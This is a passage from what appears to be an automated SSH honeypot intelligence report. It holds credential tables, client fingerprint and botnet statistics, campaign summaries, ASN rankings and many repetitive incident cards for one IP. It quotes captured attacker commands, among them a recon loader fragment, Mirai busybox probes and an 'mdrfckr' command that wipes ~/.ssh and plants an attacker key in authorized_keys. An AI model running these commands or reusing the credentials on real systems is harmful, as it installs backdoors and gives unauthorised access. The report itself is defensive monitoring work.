| `debian` | `666` | `200.199.32.174` | 2026-07-24T16:52:57 |
| `debian` | `666` | `10.0.0.73` | 2026-07-24T16:53:10 |
| `postgres` | `qwerty` | `193.32.162.42` | 2026-07-24T16:53:19 |
| `postgres` | `letmein` | `193.32.162.42` | 2026-07-24T16:54:43 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **415** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 308 |
| OpenSSH | 40 |
| libssh | 14 |
| Paramiko (Python) | 10 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 236 | 2 |
| `2ec37a7cc8da...` | Mirai/variant | 66 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 40 | 39 |
| `f555226df196...` | Mirai/variant | 9 | 3 |
| `a2de0f306611...` | Mirai/variant | 8 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 236 | 2 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 66 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 40 | 39 | Mirai/variant |
| `f555226df196...` | libssh | 9 | 3 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 1 | — |
| `bf7dbf67fa9b...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `a704be057881...` | Paramiko (Python) | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 64 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `193.32.162.42`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.92`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `144.225.187.57`, `177.53.215.134`, `91.134.133.184`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **84** |
| Unique ASNs | **59** |
| High-Risk ASNs | **51** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 9 | MEDIUM |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS1257` | Tele2 Sverige AB | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS10429` | TELEFÔNICA BRASIL S.A | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (359)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fb37fcbb5f90

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:55 |
| **Last Seen** | 2026-07-24 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:55:05` | `cowrie.session.connect` |
| `2026-07-24 14:55:05` | `cowrie.client.version` |
| `2026-07-24 14:55:05` | `cowrie.client.kex` |
| `2026-07-24 14:55:05` | `cowrie.login.success` |
| `2026-07-24 14:55:06` | `cowrie.session.params` |
| `2026-07-24 14:55:06` | `cowrie.command.input` |
| `2026-07-24 14:55:07` | `cowrie.log.closed` |
| `2026-07-24 14:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efc97e8e0a02

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:55 |
| **Last Seen** | 2026-07-24 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:55:12` | `cowrie.session.connect` |
| `2026-07-24 14:55:12` | `cowrie.client.version` |
| `2026-07-24 14:55:12` | `cowrie.client.kex` |
| `2026-07-24 14:55:13` | `cowrie.login.success` |
| `2026-07-24 14:55:13` | `cowrie.session.params` |
| `2026-07-24 14:55:13` | `cowrie.command.input` |
| `2026-07-24 14:55:14` | `cowrie.log.closed` |
| `2026-07-24 14:55:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92f07d155969

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:55 |
| **Last Seen** | 2026-07-24 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:55:19` | `cowrie.session.connect` |
| `2026-07-24 14:55:19` | `cowrie.client.version` |
| `2026-07-24 14:55:19` | `cowrie.client.kex` |
| `2026-07-24 14:55:20` | `cowrie.login.success` |
| `2026-07-24 14:55:20` | `cowrie.session.params` |
| `2026-07-24 14:55:20` | `cowrie.command.input` |
| `2026-07-24 14:55:20` | `cowrie.log.closed` |
| `2026-07-24 14:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75c719100b56

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:55 |
| **Last Seen** | 2026-07-24 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:55:26` | `cowrie.session.connect` |
| `2026-07-24 14:55:26` | `cowrie.client.version` |
| `2026-07-24 14:55:26` | `cowrie.client.kex` |
| `2026-07-24 14:55:27` | `cowrie.login.success` |
| `2026-07-24 14:55:28` | `cowrie.session.params` |
| `2026-07-24 14:55:28` | `cowrie.command.input` |
| `2026-07-24 14:55:28` | `cowrie.log.closed` |
| `2026-07-24 14:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b42de41c8a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:55 |
| **Last Seen** | 2026-07-24 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:55:33` | `cowrie.session.connect` |
| `2026-07-24 14:55:33` | `cowrie.client.version` |
| `2026-07-24 14:55:34` | `cowrie.client.kex` |
| `2026-07-24 14:55:34` | `cowrie.login.success` |
| `2026-07-24 14:55:35` | `cowrie.session.params` |
| `2026-07-24 14:55:35` | `cowrie.command.input` |
| `2026-07-24 14:55:35` | `cowrie.log.closed` |
| `2026-07-24 14:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58b5e21d4c28

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:55 |
| **Last Seen** | 2026-07-24 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:55:41` | `cowrie.session.connect` |
| `2026-07-24 14:55:41` | `cowrie.client.version` |
| `2026-07-24 14:55:41` | `cowrie.client.kex` |
| `2026-07-24 14:55:41` | `cowrie.login.success` |
| `2026-07-24 14:55:42` | `cowrie.session.params` |
| `2026-07-24 14:55:42` | `cowrie.command.input` |
| `2026-07-24 14:55:42` | `cowrie.log.closed` |
| `2026-07-24 14:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a79b9ea7741e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:55 |
| **Last Seen** | 2026-07-24 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:55:48` | `cowrie.session.connect` |
| `2026-07-24 14:55:48` | `cowrie.client.version` |
| `2026-07-24 14:55:48` | `cowrie.client.kex` |
| `2026-07-24 14:55:48` | `cowrie.login.success` |
| `2026-07-24 14:55:49` | `cowrie.session.params` |
| `2026-07-24 14:55:49` | `cowrie.command.input` |
| `2026-07-24 14:55:49` | `cowrie.log.closed` |
| `2026-07-24 14:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b216a1bb470a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:55 |
| **Last Seen** | 2026-07-24 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:55:55` | `cowrie.session.connect` |
| `2026-07-24 14:55:55` | `cowrie.client.version` |
| `2026-07-24 14:55:55` | `cowrie.client.kex` |
| `2026-07-24 14:55:55` | `cowrie.login.success` |
| `2026-07-24 14:55:56` | `cowrie.session.params` |
| `2026-07-24 14:55:56` | `cowrie.command.input` |
| `2026-07-24 14:55:56` | `cowrie.log.closed` |
| `2026-07-24 14:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a255f582f924

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:56 |
| **Last Seen** | 2026-07-24 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:56:02` | `cowrie.session.connect` |
| `2026-07-24 14:56:02` | `cowrie.client.version` |
| `2026-07-24 14:56:02` | `cowrie.client.kex` |
| `2026-07-24 14:56:03` | `cowrie.login.success` |
| `2026-07-24 14:56:04` | `cowrie.session.params` |
| `2026-07-24 14:56:04` | `cowrie.command.input` |
| `2026-07-24 14:56:04` | `cowrie.log.closed` |
| `2026-07-24 14:56:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4c5f05bc440

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:56 |
| **Last Seen** | 2026-07-24 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:56:10` | `cowrie.session.connect` |
| `2026-07-24 14:56:10` | `cowrie.client.version` |
| `2026-07-24 14:56:10` | `cowrie.client.kex` |
| `2026-07-24 14:56:10` | `cowrie.login.success` |
| `2026-07-24 14:56:11` | `cowrie.session.params` |
| `2026-07-24 14:56:11` | `cowrie.command.input` |
| `2026-07-24 14:56:11` | `cowrie.log.closed` |
| `2026-07-24 14:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-360c02d78646

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:56 |
| **Last Seen** | 2026-07-24 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:56:17` | `cowrie.session.connect` |
| `2026-07-24 14:56:17` | `cowrie.client.version` |
| `2026-07-24 14:56:17` | `cowrie.client.kex` |
| `2026-07-24 14:56:18` | `cowrie.login.success` |
| `2026-07-24 14:56:18` | `cowrie.session.params` |
| `2026-07-24 14:56:18` | `cowrie.command.input` |
| `2026-07-24 14:56:19` | `cowrie.log.closed` |
| `2026-07-24 14:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae7f048cfe20

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:56 |
| **Last Seen** | 2026-07-24 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:56:23` | `cowrie.session.connect` |
| `2026-07-24 14:56:23` | `cowrie.client.version` |
| `2026-07-24 14:56:23` | `cowrie.client.kex` |
| `2026-07-24 14:56:24` | `cowrie.login.success` |
| `2026-07-24 14:56:25` | `cowrie.session.params` |
| `2026-07-24 14:56:25` | `cowrie.command.input` |
| `2026-07-24 14:56:25` | `cowrie.log.closed` |
| `2026-07-24 14:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-811a7696132b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:56 |
| **Last Seen** | 2026-07-24 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:56:30` | `cowrie.session.connect` |
| `2026-07-24 14:56:30` | `cowrie.client.version` |
| `2026-07-24 14:56:30` | `cowrie.client.kex` |
| `2026-07-24 14:56:30` | `cowrie.login.success` |
| `2026-07-24 14:56:31` | `cowrie.session.params` |
| `2026-07-24 14:56:31` | `cowrie.command.input` |
| `2026-07-24 14:56:31` | `cowrie.log.closed` |
| `2026-07-24 14:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5bb66150ac9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:56 |
| **Last Seen** | 2026-07-24 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:56:37` | `cowrie.session.connect` |
| `2026-07-24 14:56:37` | `cowrie.client.version` |
| `2026-07-24 14:56:37` | `cowrie.client.kex` |
| `2026-07-24 14:56:38` | `cowrie.login.success` |
| `2026-07-24 14:56:39` | `cowrie.session.params` |
| `2026-07-24 14:56:39` | `cowrie.command.input` |
| `2026-07-24 14:56:39` | `cowrie.log.closed` |
| `2026-07-24 14:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b33c5e0272d8

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:56 |
| **Last Seen** | 2026-07-24 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:56:45` | `cowrie.session.connect` |
| `2026-07-24 14:56:45` | `cowrie.client.version` |
| `2026-07-24 14:56:45` | `cowrie.client.kex` |
| `2026-07-24 14:56:45` | `cowrie.login.success` |
| `2026-07-24 14:56:46` | `cowrie.session.params` |
| `2026-07-24 14:56:46` | `cowrie.command.input` |
| `2026-07-24 14:56:46` | `cowrie.log.closed` |
| `2026-07-24 14:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca2561eb7a4a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:56 |
| **Last Seen** | 2026-07-24 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:56:52` | `cowrie.session.connect` |
| `2026-07-24 14:56:52` | `cowrie.client.version` |
| `2026-07-24 14:56:52` | `cowrie.client.kex` |
| `2026-07-24 14:56:53` | `cowrie.login.success` |
| `2026-07-24 14:56:53` | `cowrie.session.params` |
| `2026-07-24 14:56:53` | `cowrie.command.input` |
| `2026-07-24 14:56:53` | `cowrie.log.closed` |
| `2026-07-24 14:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb24ba375086

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:56 |
| **Last Seen** | 2026-07-24 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:56:59` | `cowrie.session.connect` |
| `2026-07-24 14:56:59` | `cowrie.client.version` |
| `2026-07-24 14:56:59` | `cowrie.client.kex` |
| `2026-07-24 14:56:59` | `cowrie.login.success` |
| `2026-07-24 14:57:00` | `cowrie.session.params` |
| `2026-07-24 14:57:00` | `cowrie.command.input` |
| `2026-07-24 14:57:00` | `cowrie.log.closed` |
| `2026-07-24 14:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8491782a11bd

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:57 |
| **Last Seen** | 2026-07-24 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:57:06` | `cowrie.session.connect` |
| `2026-07-24 14:57:06` | `cowrie.client.version` |
| `2026-07-24 14:57:06` | `cowrie.client.kex` |
| `2026-07-24 14:57:07` | `cowrie.login.success` |
| `2026-07-24 14:57:07` | `cowrie.session.params` |
| `2026-07-24 14:57:07` | `cowrie.command.input` |
| `2026-07-24 14:57:08` | `cowrie.log.closed` |
| `2026-07-24 14:57:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abc04574230f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:57 |
| **Last Seen** | 2026-07-24 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:57:13` | `cowrie.session.connect` |
| `2026-07-24 14:57:13` | `cowrie.client.version` |
| `2026-07-24 14:57:13` | `cowrie.client.kex` |
| `2026-07-24 14:57:14` | `cowrie.login.success` |
| `2026-07-24 14:57:14` | `cowrie.session.params` |
| `2026-07-24 14:57:14` | `cowrie.command.input` |
| `2026-07-24 14:57:14` | `cowrie.log.closed` |
| `2026-07-24 14:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f66f85f6d0b5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:57 |
| **Last Seen** | 2026-07-24 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:57:20` | `cowrie.session.connect` |
| `2026-07-24 14:57:20` | `cowrie.client.version` |
| `2026-07-24 14:57:20` | `cowrie.client.kex` |
| `2026-07-24 14:57:20` | `cowrie.login.success` |
| `2026-07-24 14:57:21` | `cowrie.session.params` |
| `2026-07-24 14:57:21` | `cowrie.command.input` |
| `2026-07-24 14:57:21` | `cowrie.log.closed` |
| `2026-07-24 14:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56f0c3a9222f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 14:57 |
| **Last Seen** | 2026-07-24 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 14:57:27` | `cowrie.session.connect` |
| `2026-07-24 14:57:27` | `cowrie.client.version` |
| `2026-07-24 14:57:27` | `cowrie.client.kex` |
| `2026-07-24 14:57:27` | `cowrie.login.success` |
| `2026-07-24 14:57:28` | `cowrie.session.params` |
| `2026-07-24 14:57:28` | `cowrie.command.input` |
| `2026-07-24 14:57:28` | `cowrie.log.closed` |
| `2026-07-24 14:57:28` | `cowrie.session.closed` |

**Recommended Actions:**
